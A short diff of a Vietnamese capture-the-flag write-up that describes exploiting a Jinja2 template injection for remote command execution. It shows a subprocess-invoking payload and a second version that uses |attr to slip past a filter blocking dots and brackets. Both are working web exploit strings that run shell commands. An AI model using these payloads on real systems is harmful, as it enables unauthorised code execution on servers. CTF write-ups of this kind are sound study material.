@@ -22,7 +22,7 @@ thành
 - Mình ném ngay payload của mình vào thử xem RCE được không
 - Payload : `{{().__class__.__base__.__subclasses__()[279]('ls',shell=1,stdout=-1).communicate()}}`
 - Và nó bị chặn ![image](https://github.com/anzuukino/WannaWinFreshman-Writeup/assets/86243871/77f0aa01-5dfa-4ad9-9c2b-9e6ba8736812)
-- Sau vài thử nghiệm thì có vẽ nó chặn dấu . nên mình chuyển qua |attr
+- Sau vài thử nghiệm thì có vẽ nó chặn dấu `.` và `[]` nên mình chuyển qua |attr
 
 - Payload mới: `{{()|attr("__class__")|attr("__base__")|attr("__subclasses__")()|attr("__getitem__")(279)('ls',shell=1,stdout=-1)|attr('communicate')()}}`
 - Và ok nó hoạt động tốt
